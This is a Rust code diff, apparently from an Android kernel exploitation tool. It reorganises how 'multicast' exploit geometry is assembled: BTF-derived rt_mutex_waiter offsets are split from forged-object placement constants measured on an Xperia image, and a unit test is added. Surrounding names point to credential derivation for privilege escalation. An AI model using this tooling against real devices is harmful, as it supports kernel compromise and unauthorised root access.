@@ -97,7 +97,8 @@ pub fn remove_waiter_uses_current(dis: &[String]) -> bool {
 #[cfg(test)]
 mod tests {
     use super::{
-        multicast_geometry_5x, remove_waiter_uses_current, select_cred_caps, select_cred_refs,
+        multicast_geometry_5x, multicast_geometry_btf_only, remove_waiter_uses_current,
+        select_cred_caps, select_cred_refs,
     };
     use std::collections::BTreeMap;
 
@@ -160,6 +161,19 @@ mod tests {
         let geometry = multicast_geometry_5x(&without);
         assert!(!geometry.iter().any(|(key, _)| *key == "task_offset"));
         assert!(!geometry.iter().any(|(key, _)| *key == "lock_offset"));
+    }
+
+    #[test]
+    fn unverified_multicast_geometry_keeps_only_btf_offsets() {
+        let mut structs: BTreeMap<String, Option<u32>> = BTreeMap::new();
+        structs.insert("waiter_task".to_string(), Some(48));
+        structs.insert("waiter_lock".to_string(), Some(56));
+        assert_eq!(
+            multicast_geometry_btf_only(&structs),
+            vec![("task_offset", 48), ("lock_offset", 56)]
+        );
+        let without: BTreeMap<String, Option<u32>> = BTreeMap::new();
+        assert!(multicast_geometry_btf_only(&without).is_empty());
     }
 
     #[test]
@@ -797,28 +811,76 @@ pub fn derive_cred_5x(btf: &Btf, kernel: &[u8], init_cred_off: u64) -> Result<Cr
     })
 }
 
-/// The 5.x multicast branch in the bundled profile order. Constants are the
-/// proven Xperia layout; `task_offset`/`lock_offset` come from BTF
-/// (`rt_mutex_waiter.task` / `.lock`). A missing BTF value omits that key so
-/// the built-in profile can supply it.
-pub fn multicast_geometry_5x(structs: &BTreeMap<String, Option<u32>>) -> Vec<(&'static str, i64)> {
+/// The train-corroborated 5.x multicast geometry: the frame/copy-window fields
+/// (`waiter_off`, `buffer_size`), the BTF-derived `rt_mutex_waiter` field
+/// offsets, and the compact-waiter flag. These hold across devices on the same
+/// train. A missing BTF value omits that key so the built-in profile can
+/// supply it.
+pub fn multicast_geometry_corroborated(
+    structs: &BTreeMap<String, Option<u32>>,
+) -> Vec<(&'static str, i64)> {
     let mut geometry: Vec<(&'static str, i64)> = vec![
         ("waiter_off", MULTICAST_5X_WAITER_OFF),
         ("buffer_size", MULTICAST_5X_BUFFER_SIZE),
     ];
+    geometry.extend(multicast_waiter_field_offsets(structs));
+    geometry.push(("compact_waiter", 1));
+    geometry
+}
+
+/// The forged-object placement measured on the A301SO/Xperia image. It is not
+/// corroborated on other devices, so it is emitted only for the exact validated
+/// release and never inherited by the train.
+pub fn multicast_geometry_device_measured() -> Vec<(&'static str, i64)> {
+    vec![
+        ("fake_lock_offset", MULTICAST_5X_FAKE_LOCK_OFFSET),
+        ("fake_task_offset", MULTICAST_5X_FAKE_TASK_OFFSET),
+        ("lock_slots_offset", MULTICAST_5X_LOCK_SLOTS_OFFSET),
+        ("lock_slot_count", MULTICAST_5X_LOCK_SLOT_COUNT),
+        ("lock_slot_stride", MULTICAST_5X_LOCK_SLOT_STRIDE),
+    ]
+}
+
+fn multicast_waiter_field_offsets(
+    structs: &BTreeMap<String, Option<u32>>,
+) -> Vec<(&'static str, i64)> {
+    let mut geometry: Vec<(&'static str, i64)> = Vec::new();
     if let Some(task) = structs.get("waiter_task").copied().flatten() {
         geometry.push(("task_offset", i64::from(task)));
     }
     if let Some(lock) = structs.get("waiter_lock").copied().flatten() {
         geometry.push(("lock_offset", i64::from(lock)));
     }
-    geometry.extend([
-        ("fake_lock_offset", MULTICAST_5X_FAKE_LOCK_OFFSET),
-        ("fake_task_offset", MULTICAST_5X_FAKE_TASK_OFFSET),
-        ("lock_slots_offset", MULTICAST_5X_LOCK_SLOTS_OFFSET),
-        ("lock_slot_count", MULTICAST_5X_LOCK_SLOT_COUNT),
-        ("lock_slot_stride", MULTICAST_5X_LOCK_SLOT_STRIDE),
-        ("compact_waiter", 1),
-    ]);
+    geometry
+}
+
+/// Full 5.x multicast geometry for the exact validated release: corroborated
+/// plus the device-measured forged-object placement.
+pub fn multicast_geometry_5x(structs: &BTreeMap<String, Option<u32>>) -> Vec<(&'static str, i64)> {
+    // Kept in the bundled profile's field order (compact_waiter last).
+    let mut geometry: Vec<(&'static str, i64)> = vec![
+        ("waiter_off", MULTICAST_5X_WAITER_OFF),
+        ("buffer_size", MULTICAST_5X_BUFFER_SIZE),
+    ];
+    geometry.extend(multicast_waiter_field_offsets(structs));
+    geometry.extend(multicast_geometry_device_measured());
+    geometry.push(("compact_waiter", 1));
+    geometry
+}
+
+/// BTF-only part of the 5.x multicast geometry for releases with no verified
+/// layout evidence: only what the image itself provides (`rt_mutex_waiter.task`
+/// / `.lock`). The proven Xperia constants are omitted on purpose so they are
+/// not mistaken for image-derived values.
+pub fn multicast_geometry_btf_only(
+    structs: &BTreeMap<String, Option<u32>>,
+) -> Vec<(&'static str, i64)> {
+    let mut geometry: Vec<(&'static str, i64)> = Vec::new();
+    if let Some(task) = structs.get("waiter_task").copied().flatten() {
+        geometry.push(("task_offset", i64::from(task)));
+    }
+    if let Some(lock) = structs.get("waiter_lock").copied().flatten() {
+        geometry.push(("lock_offset", i64::from(lock)));
+    }
     geometry
 }
